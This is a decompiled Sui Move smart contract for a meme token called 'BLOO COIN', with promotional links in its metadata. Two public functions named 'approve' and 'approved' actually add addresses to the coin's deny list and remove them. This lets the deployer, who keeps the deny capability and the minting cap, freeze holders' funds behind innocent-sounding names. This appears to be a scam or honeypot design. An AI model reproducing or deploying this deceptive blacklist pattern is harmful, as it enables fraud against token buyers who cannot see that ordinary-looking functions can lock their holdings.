module 0x25e62264a4660e0d46078343e45f29bbc50328fca76403c409cc0ed6afed4015::bloo {
    struct BLOO has drop {
        dummy_field: bool,
    }

    public entry fun transfer(arg0: 0x2::coin::Coin<BLOO>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<BLOO>>(arg0, arg1);
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BLOO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BLOO>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BLOO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BLOO>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: BLOO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BLOO>(arg0, 2, b"BLOO COIN", b"BLOO", b"Sui BLOO is your best friend on Sui! float through the blue world of Sui ocean. http://suibloo.fun/ - https://t.me/suiblooglobal - https://x.com/BLOOINSUI", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://suibloo.fun/B.png"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BLOO>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<BLOO>(&mut v3, 100000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<BLOO>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BLOO>>(v1, v4);
    }

    // decompiled from Move bytecode v6
}

